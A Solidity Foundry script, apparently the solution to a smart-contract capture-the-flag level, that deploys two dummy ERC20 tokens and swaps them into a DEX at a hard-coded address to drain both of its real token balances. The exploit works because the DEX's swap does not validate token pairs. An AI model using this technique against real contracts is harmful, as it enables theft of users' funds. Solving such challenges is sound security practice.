// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

interface IDex {
    function approve(address spender, uint256 amount) external;
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
    function token1() external view returns(address);
    function token2() external view returns(address);
}

contract attackToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 101);
    }
}

contract DexSolution is Script {
    IDex dex = IDex(0x7E783286Dfee073A3B97BeC7301c1cAaafe9C923);
    function run() external
    {
        vm.startBroadcast();
        attackToken VurnblToken1 = new attackToken("VurnblToken1", "VTKN1");
        attackToken VurnblToken2 = new attackToken("VurnblToken1", "VTKN1");

        VurnblToken1.transfer(address(dex), 1);
        VurnblToken2.transfer(address(dex), 1);
        VurnblToken1.approve(address(dex), 1);
        VurnblToken2.approve(address(dex), 1);
        address token1 = dex.token1();
        address token2 = dex.token2();

        dex.swap(address(VurnblToken1), token1, 1);
        dex.swap(address(VurnblToken2), token2, 1);

        console.log("Dex Token1 balance: ", dex.balanceOf(token1, address(dex)));
        console.log("Dex Token2 balance: ", dex.balanceOf(token2, address(dex)));
        vm.stopBroadcast();
    }
}